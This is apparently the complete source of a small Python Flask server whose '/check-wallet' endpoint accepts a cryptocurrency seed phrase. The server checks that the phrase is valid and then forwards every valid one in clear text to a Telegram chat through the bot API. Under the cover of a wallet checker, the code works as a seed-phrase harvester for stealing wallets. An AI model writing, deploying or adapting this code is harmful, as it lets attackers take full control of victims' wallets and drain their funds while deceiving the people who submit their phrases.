from flask import Flask, request
import requests
from mnemonic import Mnemonic
import os

app = Flask(__name__)
mnemo = Mnemonic("english")

TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

@app.route("/check-wallet", methods=["GET"])
def check_wallet():
    mnemonic_phrase = request.args.get("mnemonic")
    if not mnemo.check(mnemonic_phrase):
        return "invalid", 400

    # (Optional) Add more logic to verify wallet balance here

    message = f"✅ VALID MNEMONIC:\n\n{mnemonic_phrase}"
    requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                 params={"chat_id": TELEGRAM_CHAT_ID, "text": message})
    return "valid"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
